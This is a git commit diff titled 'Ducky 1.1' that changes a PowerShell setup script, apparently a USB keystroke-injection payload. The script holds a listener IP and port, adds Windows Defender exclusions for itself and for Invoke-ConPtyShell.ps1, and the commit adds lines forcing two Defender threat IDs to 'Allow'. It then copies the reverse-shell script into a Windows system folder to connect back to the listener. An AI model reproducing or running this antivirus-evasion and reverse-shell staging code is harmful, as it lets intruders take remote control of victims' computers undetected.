07b63b361252ff53b1654cc3fda07be7c9344e1d
Mircox <mircea.rautoiu@gmail.com>
2021-12-24 23:08:26 +0200

    Ducky 1.1

--- Setup.ps1
+++ Setup.ps1
@@ -2,9 +2,17 @@
 $ListenerIP = "172.20.103.158"
 $ListenerPort = "35500"
 
+#threats to be allowed
+$threat1 = "2147773719"
+$threat2 = "2147780248"
+
 #add Windows Defender Exclusions:
 $TempExcl = "C:\Users\$($env:UserName)\AppData\Local\Temp"
     Add-MpPreference -ExclusionPath C:\Windows\Setup\State, C:\Windows\Setup\State\Setup.ps1, C:\Windows\Setup\State\Invoke-ConPtyShell.ps1, $TempExcl
+
+#add allowed threats
+Add-MpPreference -ThreatIDDefaultAction_Ids $threat1 -ThreatIDDefaultAction_Actions Allow -Force
+Add-MpPreference -ThreatIDDefaultAction_Ids $threat2 -ThreatIDDefaultAction_Actions Allow -Force
 
 #copy connection script:
 Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1
